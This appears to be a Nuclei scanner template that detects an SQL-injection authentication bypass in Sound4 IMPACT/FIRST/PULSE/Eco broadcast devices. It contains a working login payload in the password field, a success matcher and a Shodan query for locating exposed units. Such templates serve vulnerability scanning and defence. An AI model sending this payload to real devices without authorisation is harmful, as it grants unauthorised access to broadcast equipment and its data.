id: sound4-password-auth-bypass

info:
  name: Sound4 IMPACT/FIRST/PULSE/Eco <=2.x - 认证绕过漏洞
  author: r3Y3r53
  severity: high
  description: Sound4 IMPACT/FIRST/PULSE/Eco <=2.x - 认证绕过 存在SQL 注入漏洞。攻击者可借助可控参数干预后端 SQL 查询，从而读取敏感数据、绕过鉴权或进一步影响数据库完整性。
  reference:
    - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2022-5727.php
  metadata:
    verified: true
    max-request: 1
    shodan-query: http.html:"SOUND4"
  tags: sound4,auth-bypass,sqli,misconfig,vuln

http:
  - raw:
      - |
        POST /index.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username=test&password=%27%2Bjoxy--%2Bz

    host-redirects: true
    max-redirects: 2
    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "SOUND4 PULSE", "Network Diagnostic", "Disconnect")'
          - 'contains(content_type, "text/html")'
          - 'status_code == 200'
        condition: and
